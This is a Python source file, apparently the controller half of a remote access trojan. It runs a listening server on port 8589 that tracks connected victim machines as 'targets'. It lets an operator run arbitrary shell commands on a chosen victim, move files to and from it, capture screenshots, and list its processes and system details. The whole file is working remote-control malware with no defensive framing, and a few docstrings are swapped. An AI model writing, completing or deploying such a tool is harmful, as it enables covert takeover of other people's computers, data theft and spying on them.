import socket
import os
from time import sleep
from threading import Thread, Event
from random import choice


class Server : 
    'Init the server'

    def __init__(self) : 
        
        # Initalize some variables
        self.socket = socket.socket()
        self.host = '192.168.1.31'
        self.port = 8589
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

        self.memo_connexion = {} # attribute each thread to an connexion object
        self.memo_target = {} # reference each connexion
        

        self.start()

        
    def start(self) :
        'Receive all connexion '

        # Bind and listen
        self.socket.bind((self.host,self.port))
        self.socket.listen()
        print(f'[-] Server listenning on {self.host}:{self.port}')

        while True : #Accept all incoming connexion

            self.connexion,self.address = self.socket.accept() 

            self.th_connexion = Thread(target=self.send_command, daemon=True) # Create a thread for each connexion
            self.thread_id = self.th_connexion.getName() # Identifi each thread by a number
            print(f'\n[-] Connexion from {self.address[0]} | id : {self.thread_id}')

            th_menu = Thread(target=self.menu, daemon=True)
            th_menu.start() 


            self.memo_target[f'{self.thread_id}'] = f'{self.address}' # For identify each thread/target
            self.memo_connexion[self.thread_id] = self.connexion # Attribute the name of thread to the connexion object




    def menu(self) : 

        help_help = """
        target => See all connexions
        Thread-* => Choice connexion to send command
        upload <absolute_file_path> : upload file to target
        download <file> : download file from target
        sysinfo : display target information
        bg : return on the background
        ps : display target processus
        screenshot : screenshot

        """

        while not event.is_set() : #If no flag is up

            print()
            try :
                self.choix = input('menu: ')

                if self.choix == 'help' : print(help_help)

                if self.choix == 'target' :  
                    for x in self.memo_target.items() : 
                        print(x) 

                if self.choix.startswith('Thread') : 

                    for xx in self.memo_connexion.keys() :

                        if self.choix == xx :
                            event.set() # Set up the flag (block the thread_menu)
                            self.th_connexion.start()

            except : print(help_help)




    def send_command(self) : 
        'Send all command '

        print()


        while event.is_set() : # Flag up loop up

            
            try : 
                cmd = input('$: ')

                if cmd.startswith('cd ') : self.change_directory(cmd)
                elif cmd == 'bg' : self.background()
                elif cmd == 'clear' : self.clear()
                elif cmd.startswith('download '): self.download(cmd)
                elif cmd.startswith('upload '): self.upload(cmd)
                elif cmd == 'sysinfo' : self.sysinfo()
                elif cmd == 'screenshot' : self.screenshot()
                elif cmd == 'ps' : self.processus() 
                elif cmd == 'close' : self.close()
                elif len(cmd) > 0 : self.command(cmd)
                else : pass

            except Exception as e : pass

    def background(self) : 
        'Back to the menu'
        event.clear()
        self.menu()

    def command(self,cmd):
        'command'
        self.memo_connexion[self.choix].sendall(cmd.encode())
        try :
            print(self.memo_connexion[self.choix].recv(9999999).decode('utf8'))
        except : 
            pass

    def close(self) : 
        'Close the socket'

        self.memo_connexion[self.choix].sendall(b'close all')
        self.memo_connexion[self.choix].close()
        del self.memo_target[self.choix]

        self.background()


    def processus(self) :
        'See all process on target machine'
        self.memo_connexion[self.choix].sendall(b'ps') 
        print(self.memo_connexion[self.choix].recv(9999999).decode('utf8'))

    def change_directory(self,cmd) : 
        'cd command'
        self.memo_connexion[self.choix].sendall(cmd.encode())
        print(self.memo_connexion[self.choix].recv(9999999).decode('utf8'))

    def clear(self) : 
        'Clear the terminal'
        if os.name == 'nt' : os.system('cls')
        else : os.system('clear')

    



    def screenshot(self) : 
        'Screenshot'

        aleatoire = ''.join(choice('0123456789') for x in range(6))
        self.memo_connexion[self.choix].sendall(b'screenshot')
        f = open(f'{os.getcwd()}/screenshot{aleatoire}.png','wb')

        while True : 
            data_recv = self.memo_connexion[self.choix].recv(1024)
            #print(data_recv)

            if b'[9823 FiNI 9823]' in data_recv :

                print(f'Save as {os.getcwd()}/screenshot{aleatoire}.png')
                break
            f.write(data_recv)
        f.close()        
        self.send_command()


    def download(self,cmd) : 
        'Upload a file on the target machine'

        self.memo_connexion[self.choix].sendall(cmd.encode())
        name_file = cmd[9:]
        f = open(f'{os.getcwd()}/{name_file}','wb')


        while True : 

            data = self.memo_connexion[self.choix].recv(1024)
            if b'[9823 FiNI 9823]' in data :
                #print('stop')
                break
            f.write(data)
        f.close()

        #print('C bon')




    def upload(self,cmd) : 
        'Download a file from the target machine'
        self.memo_connexion[self.choix].sendall(cmd.encode())
        the_file = cmd[7:]
        f = open(the_file,'rb')
        size_file = os.path.getsize(the_file)
        count = 1024

        if size_file >= 1024 : 

            while True : 
                data = f.read(count)
                if data == b'' : 
                    print('stoppp')
                    break
                self.memo_connexion[self.choix].sendall(data)
                count+=1024

            self.memo_connexion[self.choix].sendall(b'[9823 FiNI 9823]')

        else : #If size file inferior to 1Mo
            data = f.read()
            self.memo_connexion[self.choix].sendall(data)
            sleep(0.5)
            self.memo_connexion[self.choix].sendall(b'[9823 FiNI 9823]')

        

    def sysinfo(self) : 
        "See target's machine information"
        self.memo_connexion[self.choix].sendall(b'sysinfo')
        data = self.memo_connexion[self.choix].recv(99999).decode('utf8')
        print(data)









if __name__ == '__main__' : 

    event = Event()
    serv = Server()
